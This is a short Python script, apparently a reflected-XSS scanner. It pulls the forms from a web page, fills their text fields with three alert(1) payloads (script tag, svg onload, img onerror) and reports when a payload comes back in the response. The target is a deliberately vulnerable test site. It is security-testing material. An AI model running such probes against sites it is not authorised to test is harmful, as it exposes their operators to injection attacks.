from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import requests

string_terminators = ["", "'", ";", "';", ]
payloads = ["<script>alert(1)</script>", '<svg onload=javascript:alert(1)/>' , '<img src=XXX onerror="alert(1)"/>']


class xss_scanner:

    def __init__(self, url):
        self.url = url

    def forms(self):
        content = bs(requests.get(self.url).content, "html.parser")
        form_Content = content.find_all("form")
        forms = []
        for form in form_Content:
            form_specs = {}
            action = form.attrs.get("action").lower()
            method = form.attrs.get("method", "get").lower()
            inputs = []
            for input_tag in form.find_all("input"):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                inputs.append({"type": input_type, "name": input_name})

            form_specs["action"] = action
            form_specs["method"] = method
            form_specs["inputs"] = inputs
            forms.append(form_specs)
        return forms

    def submit(self, form_specs, payload):
        data = {}
        for form in form_specs:
            target_url = urljoin(self.url, form["action"])
            inputs = form["inputs"]
            for input in inputs:
                if input["type"] == "text" or input["type"] == "search" or input["type"].lower() == "textarea":
                    input["value"] = payload
                    input_name = input["name"]
                    input_value = input["value"]
                if input_name and input_value:
                    data[input_name] = input_value

            if form["method"] == "post":
                return requests.post(target_url, data=data)
            else:
                # GET request
                return requests.get(target_url, params=data)

    def main(self):
        form_list = self.forms()
        for P in payloads:
            print("Payload = {}".format(P))
            response = self.submit(form_list, P)
            if P in response.content.decode():
                print("XSS Found!")
            else:
                continue


if __name__ == '__main__':
    scanner = xss_scanner(url="http://testphp.vulnweb.com/index.php")
    scanner.main()
